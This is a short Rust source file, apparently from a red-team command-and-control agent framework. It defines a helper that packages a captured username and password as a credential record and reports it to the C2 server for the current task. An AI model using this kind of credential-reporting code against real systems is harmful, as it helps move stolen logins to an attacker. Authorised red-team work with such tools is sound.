use alloc::string::String;
use alloc::sync::Arc;
use eldritch_agent::Agent;
use pb::c2::TaskContext;
use pb::{c2, eldritch};

pub fn user_password(
    agent: Arc<dyn Agent>,
    task_context: TaskContext,
    username: String,
    password: String,
) -> Result<(), String> {
    let cred = eldritch::Credential {
        principal: username,
        secret: password,
        kind: eldritch::credential::Kind::Password as i32,
    };
    let req = c2::ReportCredentialRequest {
        context: Some(c2::report_credential_request::Context::TaskContext(
            task_context,
        )),
        credential: Some(cred),
    };
    agent.report_credential(req).map(|_| ())
}
